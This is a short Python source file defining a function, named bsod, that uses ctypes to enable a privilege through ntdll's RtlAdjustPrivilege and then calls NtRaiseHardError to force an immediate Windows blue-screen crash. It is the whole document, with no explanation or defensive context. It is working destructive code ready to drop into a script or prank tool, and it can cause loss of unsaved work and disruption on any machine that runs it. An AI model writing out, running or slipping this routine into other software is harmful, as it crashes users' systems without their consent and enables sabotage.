import ctypes
def bsod():
    class CS(ctypes.Structure):
        pass
    CS_Kill = ctypes.windll.ntdll.NtRaiseHardError
    CS_Kill.argtypes = [
        ctypes.c_uint,
        ctypes.c_uint,
        ctypes.c_uint,
        ctypes.c_void_p,
        ctypes.c_uint,
        ctypes.POINTER(ctypes.c_uint),
    ]
    tmp1 = ctypes.c_bool()
    tmp2 = ctypes.c_uint()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(tmp1))
    CS_Kill(0xC0000022, 0, 0, None, 6, ctypes.byref(tmp2))
